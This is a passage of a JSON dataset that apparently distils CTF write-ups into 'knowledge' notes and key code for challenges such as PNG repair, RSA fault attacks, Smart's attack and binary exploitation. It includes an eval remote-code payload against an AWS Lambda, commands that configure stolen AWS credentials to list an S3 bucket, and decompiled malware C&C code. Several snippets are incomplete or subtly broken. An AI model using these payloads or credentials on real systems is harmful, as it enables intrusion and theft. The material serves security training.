            "When dealing with corrupted file challenges, specifically image files like PNGs, initial validation using file type detection tools (e.g., the `file` command) can indicate if the file header is corrupt or missing data. Repairing the file often begins with restoring the correct header information, which can be achieved by comparing the hex dumps (`hexdump -C`) of the corrupted file and a valid file of the same type. This comparison can reveal missing bytes in the header that, once added back, can help in making the file recognizable by operating systems and image viewers again.",
            "Tools like `pngcheck` are invaluable for identifying and fixing errors in PNG files. Errors reported by `pngcheck` can guide corrective actions, such as rectifying CRC errors by updating checksums to expected values or correcting misspelled or misplaced chunk names within the PNG file structure. For example, correcting \"IADT\" to \"IDAT\" for the data chunk name or \"INED\" to \"IEND\" for the end chunk name based on error feedback can resolve parsing issues preventing the image from being displayed properly."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid process_png(const char *filename) {\n    FILE *file = fopen(filename, \"rb\");\n    if (!file) {\n        perror(\"File opening failed\");\n        return;\n    }\n\n    unsigned char header[8];\n    fread(header, 1, 8, file);\n    if (memcmp(header, \"\\x89PNG\\r\\n\\x1a\\n\", 8) != 0) {\n        printf(\"Not a valid PNG file\\n\");\n        fclose(file);\n        return;\n    }\n\n    while (!feof(file)) {\n        unsigned char length[4];\n        fread(length, 1, 4, file);\n        unsigned int chunk_length = (length[0] << 24) | (length[1] << 16) | (length[2] << 8) | length[3];\n\n        char chunk_type[5];\n        fread(chunk_type, 1, 4, file);\n        chunk_type[4] = '\\0';\n\n        if (strcmp(chunk_type, \"IADT\") == 0) {\n            printf(\"Found IADT chunk, which is incorrect. Changing to IDAT.\\n\");\n            fseek(file, -4, SEEK_CUR);\n            fwrite(\"IDAT\", 1, 4, file);\n            fseek(file, chunk_length + 4, SEEK_CUR);\n        } else if (strcmp(chunk_type, \"INED\") == 0) {\n            printf(\"Found INED chunk, which is incorrect. Changing to IEND.\\n\");\n            fseek(file, -4, SEEK_CUR);\n            fwrite(\"IEND\", 1, 4, file);\n            fseek(file, chunk_length + 4, SEEK_CUR);\n        } else {\n            fseek(file, chunk_length + 4, SEEK_CUR);\n        }\n    }\n\n    fclose(file);\n}\n\nint main() {\n    process_png(\"file.png\");\n    return 0;\n}\n```"
    },
    {
        "name": "CictroKDF",
        "write_up": "dataset/raw/CictroKDF.md",
        "type": "crypto",
        "competition": [
            "RITSEC/2019",
            "https://ctftime.org/event/898/tasks/"
        ],
        "score": 500,
        "max_score": 625,
        "difficulty": 0.8,
        "knowledge": [
            "When implementing custom encryption or decryption functions, especially Key Derivation Functions (KDFs), it is crucial to accurately follow the mathematical or algorithmic definitions provided. Incorrect interpretations of these processes, such as improperly permuting bits based on their already changed states rather than their original positions, can lead to failure in deriving the correct key or decrypting the ciphertext correctly.",
            "In cryptographic challenges involving the creation or manipulation of keys with constraints on the data that affects the key's final value, it's important to recognize which portions of the input significantly impact the result. In this scenario, due to the algorithm design (i mod 4), only the last 4 bytes of the initial message were significant for the derived key. This knowledge can drastically reduce the complexity of the attack by focusing only on the relevant parts of the input data. For example, when using a specific KDF or encryption system where the key is derived from a message, if the system only utilizes certain parts of the message for key derivation (like the last four bytes), attackers can optimize their efforts by only concerning themselves with those parts."
        ],
        "key": "```python\ndef pi_func(byte, round):\n    # Example of a vulnerable function that could be part of the KDF\n    # This function is supposed to permute bits based on the original byte value\n    # and the round number, but it might be implemented incorrectly.\n    permuted = byte\n    for i in range(8):\n        if (byte >> i) & 1:\n            permuted ^= (1 << ((i + round) % 8))\n    return permuted\n\ndef phi_func(state, round):\n    # Another example of a vulnerable function that could be part of the KDF\n    # This function is supposed to modify the state array based on the round number\n    # but might not handle the state correctly.\n    for i in range(len(state)):\n        bi = state[i]\n        state[i] = pi_func(bi, round)\n    return state\n\ndef cictroKDF(message, rounds):\n    # Example of a vulnerable KDF implementation\n    # This function might not correctly derive a key from the message\n    # due to incorrect handling of the state and rounds.\n    state = [ord(c) for c in message[-4:]]  # Only last 4 bytes are significant\n    for round in range(rounds):\n        state = phi_func(state, round)\n    return bytes(state)\n\n# Example usage\nmessage = \"Are you silly? I'm still gunna send it!!\"\nderived_key = cictroKDF(message, 10)\nprint(derived_key)\n```"
    },
    {
        "name": "Circuitry Magic",
        "write_up": "dataset/raw/Circuitry Magic.md",
        "type": "reverse",
        "competition": [
            "m0leCon/2022/Quals",
            "https://ctftime.org/event/1615/tasks/"
        ],
        "score": 144,
        "max_score": 500,
        "difficulty": 0.288,
        "knowledge": [
            "When analyzing a binary for reversing challenges where the output depends on specific conditions (such as inputs being within a certain range), symbolic execution tools like `Z3` through `angr`'s `claripy` can automate the process of understanding and mimicking the binary's logic. This method is particularly useful when working with complex logic that outputs based on specific inputs, as it can help reverse-engineer the process to find the correct inputs or conditions. Example symbolic constraint creation:  \n```python\nimport claripy\n\n# Define symbolic variables for input bits\ninput_bits = [claripy.BVS(f'bit_{i}', 1) for i in range(6)]\n\n# Example of creating a symbolic representation of the logic in the challenge\ndef some_function(input_bits):\n    output = claripy.BVV(0, 1)  # Starting with an output of 0\n    for bit in input_bits:\n        output |= bit  # Or-ing the output with each input bit\n    return output\n\n# Using the symbolic function\nsymbolic_output = some_function(input_bits)\n```",
            "When dealing with binary challenges that involve manipulating bits and applying logic gates (such as negation and identity operations), manually converting the binary's functioning into Python for easier manipulation can be useful. This process not only allows for better understanding of the binary logic but also aids in creating accurate symbolic versions of this logic for further analysis or for constructing solutions. It's important to ensure that all operations (bitwise AND, OR, XOR, shifts) accurately reflect those in the binary to correctly model its behavior. For example, using XOR in place of negation when translating binary logic into Python code, since it can be equivalent and compatible with both concrete and symbolic execution. Example Python representation of negation using XOR:\n```python\ndef neg(input_bit):\n    # Assuming input_bit is a claripy symbolic bit, XOR with 1 acts as negation\n    return input_bit ^ 1\n```"
        ],
        "key": "```c\nint __cdecl main(int argc, const char **argv, const char **envp)  \n{  \n unsigned int v4; // [rsp+0h] [rbp-60h] BYREF  \n int i; // [rsp+4h] [rbp-5Ch]  \n char input_bits[6]; // [rsp+Ah] [rbp-56h] BYREF  \n char buf[72]; // [rsp+10h] [rbp-50h] BYREF  \n unsigned __int64 v8; // [rsp+58h] [rbp-8h]\n\n v8 = __readfsqword(0x28u);  \n v4 = 0;  \n __isoc99_scanf(\"%d\", &v4;;  \n if ( v4 < 0x40 )  \n {  \n   for ( i = 0; i <= 5; ++i )  \n   {  \n     input_bits[5 - i] = v4 & 1;  \n     v4 = (int)v4 >> 1;  \n   }  \n   first_step(input_bits, buf);  \n   second_step(buf);  \n   third_step((__int64)buf, &v4;;  \n   printf(\"%d\", v4);  \n   return 0;  \n }  \n else  \n {  \n   puts(\"Please provide an input on 6 bits\");  \n   return -1;  \n }  \n}  \n\nvoid __fastcall first_step(char *input_bits, char *buf)  \n{  \n char v2; // [rsp+12h] [rbp-Eh]  \n char v3; // [rsp+13h] [rbp-Dh]  \n int i; // [rsp+14h] [rbp-Ch]  \n int j; // [rsp+18h] [rbp-8h]  \n int k; // [rsp+1Ch] [rbp-4h]\n\n for ( i = 0; i <= 63; ++i )  \n {  \n   v2 = 0;  \n   for ( j = 0; j <= 1; ++j )  \n   {  \n     v3 = 1;  \n     for ( k = 0; k <= 5; ++k )  \n       v3 &= ((__int64 (__fastcall *)(_QWORD))*(&first_step_array[12 * i] + 6 * j + k))((unsigned int)input_bits[k]);  \n     v2 |= v3;  \n   }  \n   buf[i] = v2;  \n }  \n}  \n\nvoid __fastcall second_step(char *a1)  \n{  \n int i; // [rsp+14h] [rbp-4h]\n\n for ( i = 0; i <= 63; ++i )  \n   a1[i] &= flag[i];  \n}  \n\nvoid __fastcall third_step(char *buf, _DWORD *output)  \n{  \n int i; // [rsp+18h] [rbp-18h]  \n int j; // [rsp+1Ch] [rbp-14h]  \n char v4[8]; // [rsp+20h] [rbp-10h]  \n unsigned __int64 v5; // [rsp+28h] [rbp-8h]\n\n v5 = __readfsqword(0x28u);  \n *output = 0;  \n for ( i = 0; i <= 7; ++i )  \n {  \n   for ( j = 0; j <= 7; ++j )  \n     v4[j] = buf[chains[8 * i + (j + 1) % 8]] & buf[chains[8 * i + j]];  \n   *output |= (char)(v4[6] | v4[5] | v4[4] | v4[3] | v4[2] | v4[1] | v4[0] | v4[7]);  \n }  \n}  \n```"
    },
    {
        "name": "City RSA",
        "write_up": "dataset/raw/City RSA.md",
        "type": "pwn",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 557,
        "max_score": 792,
        "difficulty": 0.7032828282828283,
        "knowledge": [
            "**Buffer Overflow in RSA Implementation**: In scenarios where a custom RSA signing service contains a buffer overflow vulnerability, specifically when reading input with `fgets`, it's possible to trigger unexpected behavior that can allow bypassing security measures or even recovering private RSA parameters. This can occur if the service reads more input than expected and overwrites crucial variables, such as those holding RSA coefficients or exponents. This method was effectively used to alter the service's behavior by inputting a byte `0x00` multiple times to overwrite the `d_p_str`, leading to a faulty RSA signature that ultimately allowed the recovery of the RSA modulus factorization.",
            "**Recovering RSA Parameters through Faulty Signatures**: A deep understanding of the Chinese Remainder Theorem (CRT) and RSA's mathematical properties can be exploited to recover private keys or decrypt messages without them. When a faulty signature is generated possibly due to a buffer overflow or a programming mistake in how CRT is implemented (e.g., incorrect handling of exponents or modular inverses), the faulty signature can help in factorizing the RSA modulus N by calculating the `gcd(signature, N)`, hence obtaining `p` and consequently `q`. This knowledge is critical for CTF challenges that involve analyzing and exploiting flawed RSA implementations to recover private keys or secret messages.\n\n**Sample exploitation code snippet to factorize N and recover RSA parameters:**\n```python\nfrom math import gcd\n# Assume a is the faulty signature obtained, and N is the known public modulus\na = 0x32bc2267af0d1568... # truncated for brevity\nN = 0x98ac865ef6a31313... # truncated for brevity\ne = 0x10001  # Public exponent\n\n# Factorize N by calculating the gcd of the signature and N\np = gcd(a, N)\nq = N // p\n\n# Verify p and q are correct\nassert p * q == N\n\n# Use Extended Euclidean Algorithm to find the multiplicative inverse of e modulo phi(N)\ndef find_inverse(x, y):\n    # Implementation of the Extended Euclidean Algorithm to find inverses\n    # Body skipped for brevity\n\nd = find_inverse(e, (p-1)*(q-1))\n\n# Now, with d recovered, messages can be decrypted or signed.\n```\nThis approach underscores the importance of correctly handling input sizes and validating cryptographic operations in custom implementations to prevent vulnerabilities that could lead to private key leakage or unintended message recovery."
        ],
        "key": "```c\nint main(int argc, const char** argv) {  \n   city_rsa_config cfg;  \n   /* RSA parameters */  \n   char p_str[1024];  \n   char p_inv_str[1024];  \n   char q_str[1024];  \n   char d_str[1024];  \n   char e_str[1024];  \n   char d_q_str[1024];  \n   char d_p_str[1024];  \n   char input[32];  \n   char input_hex[67];  \n   char result[1024];  \n   int i;\n\n   // [...] config is loaded here\n\n   printf(\"Enter message:\");  \n   fflush(stdout);  \n   fgets(input, sizeof(input_hex) / 2, stdin);\n\n   input_hex[0] = '0';  \n   input_hex[1] = 'x';  \n   for(i = 0; i <= strlen(input); i++){  \n       sprintf(input_hex + 2 + i*2, \"%02X\", input[i]);  \n   }\n\n   puts(input_hex);\n\n   if (strstr(input_hex, \"594553\") != NULL) {  \n       // Security measure, don't agree to anything  \n       return 1;  \n   }\n\n   /* Sign via RSA */  \n   city_rsa_init(&cfg, p_str, q_str, p_inv_str, d_str, e_str, d_p_str,\nd_q_str);  \n   //city_print_config(&cfg;;  \n   city_rsa_sign(&cfg, result, input_hex);  \n   printf(\"The signature of your message is: 0x%s\\n\", result);\n\n   return 0;  \n}  \n```"
    },
    {
        "name": "Clever Thinking",
        "write_up": "dataset/raw/Clever Thinking.md",
        "type": "crypto",
        "competition": [
            "UofTCTF/2024",
            "https://ctftime.org/event/2219/tasks/"
        ],
        "score": 442,
        "max_score": 500,
        "difficulty": 0.884,
        "knowledge": [
            "When attempting to solve elliptic curve cryptography challenges, and the discrete logarithm problem (DLP) appears hard or unsolvable directly, Smart's attack becomes applicable under specific conditions. Specifically, this attack is viable when the order of the elliptic curve group over a finite field equals the characteristic of the field (e.g., the order of the group is p, where p is a prime defining the finite field GF(p)). This approach requires lifting the elliptic curve points to a p-adic field, performing operations within this field, and then extracting the discrete logarithm ratio from the lifted points. Before applying Smart's attack, verify the elliptic curve group's order matches the field's characteristic using the `order()` function.",
            "To implement Smart's attack in a practical scenario such as a CTF challenge, follow these steps within a Sage script:\n   - Define the elliptic curve with its parameters.\n   - Verify the curve's order matches the prime characteristic of the field to ensure Smart's attack applicability.\n   - Lift the given elliptic curve points to the p-adic field and find corresponding p-adic points that match the original points' x and y coordinates modulo p.\n   - Calculate the \"phi\" values for the public base point and the challenge's public key point by transforming their p-adic multiples by p, then extracting and dividing their x and y coordinates respectively.\n   - The quotient of these \"phi\" values yields the private key, which can then be used to compute the shared secret by scalar multiplication with the other individual's public key.\n\nExample of applying Smart's attack within a challenge context:\n```sage\np = 235322474717419  # Prime characteristic of the finite field\na = 0  # Curve coefficient\nb = 8856682  # Curve coefficient\n\n# Define the elliptic curve over GF(p) with coefficients a and b\nE = EllipticCurve(GF(p), [a, b])\nassert(E.order() == p)  # Ensure the curve's order equals p\n\n# Define the public base and the other party's public key\npub_base = E(185328074730054 , 87402695517612)\nQ1 = E(184640716867876 , 45877854358580)\n\n# Apply Smart's attack to find the private key\npriv_key = SmartAttack(pub_base, Q1, p)\n\n# Use the private key to compute the shared secret\nQ2 = E(157967230203538,128158547239620)\nshared_secret = priv_key * Q2\n\n# Output the shared secret, which is the solution\nprint(shared_secret)\n```\nThis strategy demonstrates a specific method for solving elliptic curve-based CTF challenges that involve the discrete logarithm problem when direct computation is infeasible."
        ],
        "key": "```sage\nm = 235322474717419  \nF = GF(m)  \nC = EllipticCurve(F, [0, 8856682])\n\npublic_base = (185328074730054:87402695517612:1)\n\nQ1 = (184640716867876:45877854358580:1) # my public key  \nQ2 = (157967230203538:128158547239620:1) # your public key\n\nsecret = ...  \nmy_private_key = ...  \nassert(my_private_key*public_base == Q1)  \nassert(my_private_key*Q2 == secret)  \n```"
    },
    {
        "name": "Close primes",
        "write_up": "dataset/raw/Close primes.md",
        "type": "crypto",
        "competition": [
            "ASIS/2019/Finals",
            "https://ctftime.org/event/805/tasks/"
        ],
        "score": 136,
        "max_score": 477,
        "difficulty": 0.2851153039832285,
        "knowledge": [
            "For challenges that involve finding prime numbers with specific properties, starting the search from the smallest possible value that meets the criteria (e.g., the smallest 512 bit prime in this case) can be an effective strategy. This approach can capitalize on the nature of prime numbers and the specific conditions set by the challenge such as the difference between the square roots of consecutive primes. The criteria stipulate a minimum difference between the square roots, implying that smaller primes might inherently meet this condition more easily due to their numerical properties.",
            "When tasked with generating primes that satisfy a very precise mathematical condition (such as a specific difference between their square roots), employing a brute force approach with high precision arithmetic libraries (like `gmpy2` for Python, with a precision setting high enough to ensure accurate calculations) can be a straightforward and effective solution. This approach relies on incrementally finding the next prime (`gmpy2.next_prime()`) and calculating the required property (in this case, the difference between the square roots) until the condition is met.\n\nExample payload snippet:\n```python\nimport gmpy2\nfrom gmpy2 import mpf, sqrt\n\nmp.prec = 1024  # Set high precision for calculations\np = gmpy2.next_prime(2**511)  # Start with the smallest 512 bit prime\neps = mpf(\"0.000000000000000000000000000000000000000000000000000000000000000000000000016\")  # Set the precision for the epsilon value\nwhile True:\n   q = gmpy2.next_prime(p)  \n   if sqrt(q) - sqrt(p) >= eps:  \n       print(f\"Prime p: {p}, Prime q: {q}\")\n       break\n   p = q\n```"
        ],
        "key": "```python\nmp.prec = 1024  \np = gmpy2.next_prime(2 ** 511)  \nwhile True:  \n   q = gmpy2.next_prime(p)  \n   eps = mpf(\"0.000000000000000000000000000000000000000000000000000000000000000000000000016\")  \n   if mp.sqrt(q) - mp.sqrt(p) >= eps:  \n       print(q - p, eps - (mp.sqrt(q) - mp.sqrt(p)))  \n       print(mp.sqrt(q) - mp.sqrt(p))  \n       print(mp.sqrt(q) - mp.sqrt(p) >= eps)  \n       print(p)  \n       break  \n   p = q  \n```"
    },
    {
        "name": "Cloud 9_9",
        "write_up": "dataset/raw/Cloud 9_9.md",
        "type": "This write-up corresponds to a **misc** (miscellaneous) challenge in a CTF (Capture The Flag) competition.",
        "competition": [
            "nullconHackIM/2022",
            "https://ctftime.org/event/1718/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When exploiting serverless applications such as AWS Lambda, injecting Python code using the `eval` function can lead to Remote Code Execution (RCE). If the application evaluates user input through the `eval` function without proper input validation, arbitrary Python code can be executed. In this scenario, Python's ability to import modules within a string passed to the `eval` function was used to execute commands on the server. \n    - Example payload: `__import__('os').popen('ls').read()`",
            "Post-exploitation steps for serverless applications often include enumeration of the environment variables. These variables can contain sensitive information such as AWS access keys (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`). These keys can then be used to access other services within the AWS environment, such as S3 buckets, potentially leading to the discovery of stored secrets or confidential data.\n    - For leveraging the enumerated AWS access keys, one can configure their own AWS CLI tool with the stolen credentials to access AWS resources like S3 buckets that the compromised Lambda function has access to.\n    - AWS CLI command to configure stolen credentials: \n        ``` \n        aws configure set aws_access_key_id ASIA22D7J5LEA25ENS5X \n        aws configure set aws_secret_access_key L3OWcJut4kv9pziGUVI6rFUbOnVTiCzkN58zv8Pw \n        aws configure set aws_session_token <token_here>\n        ```\n    - AWS CLI command to access S3 bucket: `aws s3 ls s3://nullcon-s3bucket-flag4/`"
        ],
        "key": "```python\nimport json\n\ndef lambda_handler(event, context):  \n   return {  \n       'result' : eval(event['input'])  \n   }\n```"
    },
    {
        "name": "Coal Miner",
        "write_up": "dataset/raw/Coal Miner.md",
        "type": "pwn",
        "competition": [
            "UMDCTF/2020",
            "https://ctftime.org/event/1040/tasks/"
        ],
        "score": 800,
        "max_score": 800,
        "difficulty": 1.0,
        "knowledge": [
            "When encountering a binary exploitation challenge where a `gets` function creates an opportunity for a stack buffer overflow but stack protections like canaries are in place, an alternative approach to hijack program execution involves overwriting function pointers or Global Offset Table (GOT) entries. This tactic requires precise control over the overflow payload to adjust specific memory addresses. Example usage of this technique is to overwrite an address in the GOT with the address of a useful function like `system()` by using a carefully crafted payload that avoids triggering stack canaries and takes advantage of functions like `print` to leak memory addresses necessary for calculating offsets.",
            "For challenges that involve memory leak exploitation to defeat Address Space Layout Randomization (ASLR) and identify libc versions, the use of a print function to disclose the contents of memory addresses pointed to by overwritten pointers can be crucial. This method can reveal addresses of libc functions, which can then be input into tools like https://libc.nullbyte.cat/ to determine the libc version and calculate the base address of libc in memory. This information is critical for creating an exploit that calls system functions or executes shellcode by referencing libc addresses and offsets correctly. An initial step in this process might involve overwriting a less critical pointer (such as a description pointer in a `struct`) with the address of a GOT entry to leak its runtime-resolved address through a controlled print output."
        ],
        "key": "```c\nvoid AddItem(astruct *param_1)  \n{  \n uint uVar1;  \n void *pvVar2;  \n long in_FS_OFFSET;  \n undefined8 local_28;  \n long local_20;  \n  \n local_20 = *(long *)(in_FS_OFFSET + 0x28);  \n uVar1 = param_1->number_of_items;  \n pvVar2 = malloc(0x20);  \n *(void **)(&param_1->description + (ulong)uVar1 * 0x10) = pvVar2;  \n puts(\"Enter a name: \");  \n gets(&param_1->name + (ulong)(uint)param_1->number_of_items * 0x10);  \n puts(\"Enter a description: \");  \n gets((char *)&local_28);  \n **(undefined8 **)(&param_1->description +\n(ulong)(uint)param_1->number_of_items * 0x10) = local_28;  \n param_1->number_of_items = param_1->number_of_items + 1;  \n if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {  \n                   /* WARNING: Subroutine does not return */  \n   __stack_chk_fail();  \n }  \n return;  \n}\n```"
    },
    {
        "name": "Code Golf",
        "write_up": "dataset/raw/Code Golf.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 333,
        "max_score": 500,
        "difficulty": 0.666,
        "knowledge": [
            "When golfing Haskell code for space efficiency, a key strategy is to utilize Haskell's rich set of infix operators and functions that can often reduce the syntactical overhead. For instance, using `$` for application can save parentheses, `<$>` instead of `map` for benefits similar to `$`, `=<<` in place of `concatMap`, and list comprehension cleverness to reduce pattern matching syntax. These transformations help in minimizing the length of the Haskell code while maintaining functionality.  \nExample transformation:  \nOriginal: `concatMap (\\str -> replicate (length str) ' ') strings`  \nGolfed: `(>> \" \") =<< strings`",
            "In challenges involving the manipulation and combination of strings with placeholders or holes (spaces in this case), leveraging the properties of character encoding can optimize the process. For instance, knowing that ASCII space character (` `) has a lower value than any printable ASCII character, the maximum (`max`) function can be utilized to merge two characters in a way that spaces can be \"overwritten\" by any other character. This leverages the ordering of ASCII values to fill gaps in strings efficiently, which can be particularly useful in encoding or decoding challenges where minimizing the final output length is crucial.  \nExample code snippet (conceptual):  \n```haskell\nmergeChars :: Char -> Char -> Char\nmergeChars a b = max a b\n```"
        ],
        "key": "```haskell\nimport Data.List  \nimport Data.Maybe  \nimport Control.Monad\n\n-- | the solution function  \ng :: [String] -> String  \ng xs = minimum . catMaybes $ [sequence . dropWhile (==Nothing)  \n                            . map collapseW . transpose $ s | s <- shifts l xs]  \n where  \n   l = sum $ map length xs\n\n-- | find all possible ways to shift a string 's' with at most 'l'  \n-- characters of padding.  \nwordShifts :: Int -> String -> [String]  \nwordShifts l s = [space <> s | space <- spaces]  \n where  \n   spaces = inits $ replicate l ' '\n\n-- | find every possible way to shift a list of strings, where  \n-- each string can be shifted at most 'l' characters to the left  \nshifts :: Int -> [String] -> [[String]]  \nshifts l [] = [[]]  \nshifts l (w:ws) = do  \n shifted <- wordShifts l w  \n rest <- shifts l ws  \n return $ shifted : rest\n\n-- | try to collapse a string into a single character (think of this as reducing  \n-- a column to 1 character, this fails if there are more than 2 non-space characters  \n-- or no non-space characters)  \ncollapseW :: String -> Maybe Char  \ncollapseW s = do  \n [y] <- foldMap convert s  \n pure y  \n where  \n   convert ' ' = Nothing  \n   convert c   = Just [c]  \n```"
    },
    {
        "name": "Coins",
        "write_up": "dataset/raw/Coins.md",
        "type": "pwn",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When facing proof-of-work (PoW) challenges which require finding a string that hashes to a specific value, a brute force approach can be applied by iterating over all possible combinations of characters until the target hash is found. The Python `hashlib` library can be used to generate SHA256 hashes to compare with the target hash.\n    - Example payload generation script:\n    ```python\n    import hashlib, string\n\n    def solve_pow(suffix, target_hash):\n        for i in string.digits + string.ascii_letters:\n            for j in string.digits + string.ascii_letters:\n                for k in string.digits + string.ascii_letters:\n                    for l in string.digits + string.ascii_letters:\n                        prefix = str(i)+str(j)+str(k)+str(l)\n                        new_hash = hashlib.sha256((prefix+suffix).encode()).hexdigest()\n                        if new_hash == target_hash:\n                            return prefix\n    ```",
            "For challenges requiring identification of an anomalous item in a collection with minimal queries, employing binary search logic can significantly reduce the number of required queries. This strategy is applicable in scenarios where the challenge allows for indirect measurement of properties (e.g., weight via XOR operations). Preliminary queries to establish a baseline (e.g., determining the weight of non-faulty items) can further refine the search process.\n    - Example approach for finding an anomalous coin:\n    ```python\n    def find_faulty_coin(low, high, legit_weight, query_func):\n        while low < high:\n            mid = (low + high) // 2\n            response = query_func(low, mid)\n            if response == 0 or response == legit_weight:\n                low = mid + 1\n            else:\n                high = mid\n        return low  # Assumed the position of the faulty coin\n    ```\n    - Note: `query_func(low, mid)` represents a function to interact with the challenge server, sending a query for the range `[low, mid]` and returning the server's response."
        ],
        "key": "```python\ndef legit_weight(r,n):  \n   r.sendline('0 0')  \n   r.recvuntil('is ')  \n   x = int(str(r.recvuntil('\\n'))[2:-3])  \n   r.sendline('1 1')  \n   r.recvuntil('is ')  \n   y = int(str(r.recvuntil('\\n'))[2:-3])  \n   if x == y:  \n       return x  \n   else:  \n       r.sendline('2 2 ')  \n       r.recvuntil('is ')  \n       z = int(str(r.recvuntil('\\n'))[2:-3])  \n       if x == z:  \n           return z  \n       else:  \n           return y\n```"
    },
    {
        "name": "Compromised",
        "write_up": "dataset/raw/Compromised.md",
        "type": "crypto",
        "competition": [
            "CyberSecurityRumble/2021",
            "https://ctftime.org/event/1429/tasks/"
        ],
        "score": 564,
        "max_score": 760,
        "difficulty": 0.7421052631578947,
        "knowledge": [
            "When analyzing malware or suspicious activities within minidump files using WinDBG, it's critical to check the backtrace of threads for signs of strange behavior or calls to functions from unusual locations. Suspicious threads may call typical functions like `SleepEx` from abnormal addresses indicating potentially malicious code execution. This approach aids in the initial identification of malware components or behaviors without executing the malware.",
            "In scenarios involving encrypted malware communication, especially when dealing with complex malware such as Cobalt Strike stagers, extracting encryption keys from memory dumps or reconstructed executables allows for the decryption and analysis of command and control (C&C) communications. After identifying the encryption method and obtaining the keys (AES keys in this case), one can decrypt network traffic captured in pcap files. This process involves:\n   - Identifying the encryption algorithm and key generation process from the malware binary or memory dump,\n   - Extracting encryption keys using static analysis tools (e.g., IDA Pro for analyzing disassembled code and WinDBG for memory inspection),\n   - Decrypting the network traffic using the extracted keys to understand the malware's communication protocols and actions.\n\nExample script snippet for AES decryption (derived from analyzed malware's method of communication and encryption usage):\n```python\nfrom Crypto.Cipher import AES\n\ndef decrypt_aes(data, key):\n    iv = b\"abcdefghijklmnop\"  # Initialization vector might vary and should be identified from the malware analysis\n    aes = AES.new(key, AES.MODE_CBC, iv)\n    decrypted_data = aes.decrypt(data)\n    return decrypted_data\n```\nThis Python function uses the PyCryptodome library to decrypt data with AES in CBC mode, which is a common scenario in malware's encrypted communications."
        ],
        "key": "```c\nif ( (unsigned int)QueryCnCOrder(fetchOrderDns, &ip_obf) )  \n{  \n  v15 = v12 ^ ntohl(ip_obf);  \n  ip_obf = v15;  \n  if ( v15 && (v15 & 0xFFFFFFF0) == 240 )  \n  {  \n    sub_18000EF14(v15);  \n    v16 = ip_obf;  \n    if ( (ip_obf & 1) != 0 )  \n    {  \n      exfiltrateData(v13, a1, (__int64)&encryptedFingerprint, encryptedFingerprintSize);  \n      v16 = ip_obf;  \n    }  \n    if ( (v16 & 2) != 0 )  \n    {  \n      cncLen = get_encrypted_int(4u);  \n      v18 = sendTxtRequest(a1, (char *)bufferFromServer, cncLen);  \n    }  \n    else if ( (v16 & 4) != 0 )  \n    {  \n      www6Len = get_encrypted_int(4u);  \n      v18 = sendWww6Typ(a1, bufferFromServer, www6Len);  \n    }  \n    else  \n    {  \n      cdnLen = get_encrypted_int(4u);  \n      v18 = sendCdnRequest(a1, bufferFromServer, cdnLen);  \n    }  \n    if ( v18 > 0 )  \n    {  \n      v21 = decryptResponse(bufferFromServer, v18);  \n      if ( v21 > 0 )  \n        doStuffWithResponse(bufferFromServer, (unsigned int)v21);  \n    }  \n  }  \n}\n```\n\n```c\nvoid *__fastcall GrabInfo(GetInfoStruct *Src, unsigned int len)  \n{  \n  DWORD CurrentProcessId; // ebx  \n  DWORD TickCount; // eax  \n  char someflags; // bl  \n  HANDLE CurrentProcess; // rax  \n  DWORD v8; // eax  \n  unsigned int v9; // edi  \n  __int64 pubKey; // rax  \n  block_iterator a1; // [rsp+30h] [rbp-20h] BYREF  \n  BYTE rand1[16]; // [rsp+40h] [rbp-10h] BYREF  \n  __int16 a2; // [rsp+90h] [rbp+40h] BYREF  \n  __int16 OEMCP; // [rsp+98h] [rbp+48h] BYREF\n\n  a2 = GetACP();  \n  OEMCP = GetOEMCP();  \n  randomGenerator(rand1, 0x10u, 0i64);  \n  aesCreateContext((__int64)rand1);  \n  CurrentProcessId = GetCurrentProcessId();  \n  TickCount = GetTickCount();\n\n  /* some snipped useless stuff */\n\n  /* construct the blob to be sent to the C&C */  \n  make_block_iterator(&a1, Src, len);  \n  packMem(&a1, rand1, 16);  \n  packMem(&a1, &a2, 2);  \n  packMem(&a1, &OEMCP, 2);  \n  pack_int_bigendian(&a1, sessionRandIdentifier);  \n  v8 = GetCurrentProcessId();  \n  pack_int_bigendian(&a1, v8);  \n  pack_short_bigendian(&a1, 0);  \n  pack_char(&a1, someflags);  \n  sub_180014750(&a1;;  \n  v9 = set_buf(&a1;;  \n  memset(&encryptedFingerprint, 0, 0x400ui64);  \n  encryptedFingerprintSize = 128;  \n  memmove(&encryptedFingerprint, Src, v9);\n\n  /* decode pubkey and encrypt blob */  \n  pubKey = cryptoshitFunc(7i64);  \n  rsa_encrypt(pubKey, (int)Src, v9, (int)&encryptedFingerprint,\n  (__int64)&encryptedFingerprintSize);  \n  /* wipe cleartext blob */  \n  return memset(Src, 0, v9);  \n}\n```\n\n```c\n__int64 __fastcall aesCreateContext(__int64 a1)  \n{  \n  __int64 result; // rax  \n  __int128 hash[2]; // [rsp+30h] [rbp-28h] BYREF  \n  unsigned int hashlen; // [rsp+68h] [rbp+10h] BYREF\n\n  hashlen = 32;  \n  addHashTable(&sha256_crypt_callback);  \n  hashMethodIdx = lookup_hash_func(\"sha256\");  \n  if ( (unsigned int)call_hash_method(hashMethodIdx, a1, 0x10u, hash, &hashlen)\n  )  \n    exit(1);  \n  aes_key = hash[0];  \n  hmac_key = hash[1];  \n  iv = *(_OWORD *)\"abcdefghijklmnop\";  \n  constructCryptoTable(&aes_crypt_callback);  \n  cryptoMethodIdx = lookup_crypto_func(\"aes\");  \n  result = aes_create_context((unsigned int *)&aes_key, 16, 0, aes_ctx);  \n  if ( (_DWORD)result )  \n    exit(1);  \n  return result;  \n}\n```"
    },
    {
        "name": "Computeration Fixed",
        "write_up": "dataset/raw/Computeration Fixed.md",
        "type": "web",
        "competition": [
            "justCTF/2021",
            "https://ctftime.org/event/1050/tasks/"
        ],
        "score": 333,
        "max_score": 500,
        "difficulty": 0.666,
        "knowledge": [
